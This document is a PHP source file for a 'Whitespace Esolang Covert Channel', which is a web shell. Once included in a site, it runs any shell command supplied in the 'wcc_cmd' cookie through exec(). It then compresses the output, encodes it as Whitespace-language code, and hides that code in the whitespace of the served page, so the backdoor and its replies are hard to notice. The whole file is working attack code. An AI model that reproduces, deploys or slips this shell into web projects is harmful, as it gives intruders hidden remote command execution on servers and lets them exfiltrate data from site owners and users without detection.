<?php

/**
 * Whitespace Esolang Covert Channel (WCC)
 *
 * @author	Jan Seidl <jseidl at wroot dot org>
 * @date	2014-02-18
 */

# Configuration

define('WCC_ENABLED', true);
define('WCC_COOKIE_KEY', 'wcc_cmd');

# Shortcuts, improved readability
define('TAB', chr(9));
define('SPACE', chr(32));
define('LF', chr(10));

# Whitespace language constants
define('W_IO', TAB.LF);
define('W_STACK', SPACE);
define('W_END_PROGRAM', LF.LF.LF);
define('W_STACK_PUSH', W_STACK.SPACE);
define('W_IO_OUTPUT_NUMBER', W_IO.SPACE.TAB);
define('W_IO_OUTPUT_CHAR', W_IO.SPACE.SPACE);

global $buffer;

/**
 * WCC Functions
 */
function wcc_init() {


	if (
		!isset($_COOKIE[WCC_COOKIE_KEY]) ||
		empty($_COOKIE[WCC_COOKIE_KEY])
	) return false; # early return

	# Start buffering
	ob_start("wcc_output_trap");

	# Exec command
	$cmd_output = wcc_exec($_COOKIE[WCC_COOKIE_KEY]); # gzipped to reduce payload size & whitespaced

	# Register shutdown function that registers a 
	# shutdown function as last in chain ;)
	# (unless another shutdown functions does the same)
	register_shutdown_function('wcc_shutdown', $cmd_output);

	return true;

}//end :: wcc_init

function wcc_output_trap($current_buffer) {
    global $buffer;
    $buffer .= $current_buffer;
    return '';
}//end :: wcc_output_trap

function wcc_shutdown($whitespace_payload) {
	register_shutdown_function('wcc_merge_output', $whitespace_payload); # register last ;)
}//end :: wcc_shutdown

function wcc_merge_output($whitespace_payload) {

	# Get value of output buffer so far
    global $buffer;
	$page_content = $buffer.ob_get_contents();
	# Stop buffering
	ob_end_clean();

	# "Sanitize" page content
	$sanitized_content = str_replace(TAB, SPACE, $page_content);
	$content_lines = explode(LF, $sanitized_content);

	$content_tokens = wcc_tokenize_content($content_lines);
	$whitespace_tokens = wcc_tokenize_whitespace($whitespace_payload);

	# Build Content
	$final_content = wcc_build_content($whitespace_tokens, $content_tokens);

	# Show content
	print $final_content;

	# Force 'clean' exit
	exit(0);

}//end :: wcc_merge_output

function wcc_build_content($whitespace_tokens, $content_tokens) {

	$final_content = '';

	foreach ($whitespace_tokens as $wt) {
		$ct = wcc_get_token(&$content_tokens);
		if ($ct !== null) $final_content .= $ct; # insert content token
		$final_content .= $wt; # insert whitespace token
	}//end :: foreach

    # Glue remaining parts
    foreach ($content_tokens as $line) {
        $final_content .= implode(SPACE, $line).LF;
    }//end :: foreach

	return $final_content;

}//end :: wcc_build_content

function wcc_get_token(&$content_tokens) {

    do {
        reset($content_tokens);
        $lineno = key($content_tokens);
        $line = &$content_tokens[$lineno];
        if (count($line) === 0) array_shift($content_tokens); # remove line
    } while (count($line) === 0 && count($content_tokens) > 0); //end :: do/while

    if (!is_array($line) || count($line) === 0) return null;
    
    $token = array_shift($line);

    return $token;

}//end wcc_get_token

function wcc_tokenize_whitespace($whitespace_payload) {
	return str_split($whitespace_payload);
}//end :: wcc_tokenize_whitespace

function wcc_tokenize_content($content_lines){

	# Tokenization
	$tokens = array();

	# Tokenize real content
	foreach ($content_lines as $lineno => $line) {
		$tokens[$lineno] = array();
		if (strlen($line) === 0) continue; # skip empty lines
		$sanitizedLine = str_replace(LF, '', $line); # remove linefeeds
		$parts = explode(SPACE, $sanitizedLine);
		foreach ($parts as $part) {
			if (strlen($part) === 0) continue;
			array_push($tokens[$lineno], $part);
		}//end :: foreach
	}//end :: foreach

	return $tokens;

}//end :: wcc_merge_output

function wcc_exec($cmd) {
	$output = '';
	exec($cmd, $output);
	return wcc_whitespace_print_string(gzdeflate(implode($output, "\n"), 9));
}//end :: wcc_exec

/**
 * Whitespace Esolang Functions
 */

function bin2wspace($binrep) {

    $wspace = '';
    $wspace .= W_STACK_PUSH;
    $wspace .= SPACE; # positive signed number

	$len = strlen($binrep);

	for ($i=0;$i<$len;$i++) $wspace .= ((int)($binrep[$i]) === 0) ? SPACE : TAB;

    $wspace .= LF;

    return $wspace;
}//end :: bin2wspace

function wcc_whitespace_print_string($string, $newline = True, $endProgram = True) {

	if ($newline) $string .= "\n";

	$reversed = strrev($string);
	$len = strlen($reversed);

	$code = '';

	for ($i=0;$i<$len;$i++){
		$binchar = unpack('H*', $reversed[$i]);
		$binchar = base_convert($binchar[1], 16, 2);
		$code .= bin2wspace($binchar);
	}//end :: for

	for ($i=0;$i<$len;$i++) $code .= W_IO_OUTPUT_CHAR;

	if ($endProgram) $code .= W_END_PROGRAM;

	return $code;

}//end :: wcc_whitespace_print_string

/**
 * Program Main
 */

if (WCC_ENABLED) wcc_init();

?>
